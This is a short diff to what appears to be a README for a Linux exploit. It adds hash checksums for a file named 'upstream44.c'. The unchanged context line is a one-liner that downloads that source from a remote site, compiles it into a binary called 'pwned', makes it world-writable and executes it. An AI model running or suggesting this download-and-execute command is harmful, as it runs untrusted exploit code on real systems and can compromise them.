@@ -45,6 +45,14 @@ reboot
 wget -P /tmp http://cyseclabs.com/exploits/upstream44.c &&cd /tmp && gcc -o pwned  upstream44.c && chmod 777 pwned && ./pwned 
 
 
+upstream44.c
+
+sha256sum b71b2317c2f2461f0c25a650c9c6a4dd2399e5d7f800ec19822ba720a574030d
+
+sha1sum d91b5dd8b074dd33bbb6994ab21af4e6279c9098
+
+md5sum f38c046a22fd85e3aab3aa7ea4ef21a4
+
 ```
 
 ![](./0day.jpg)
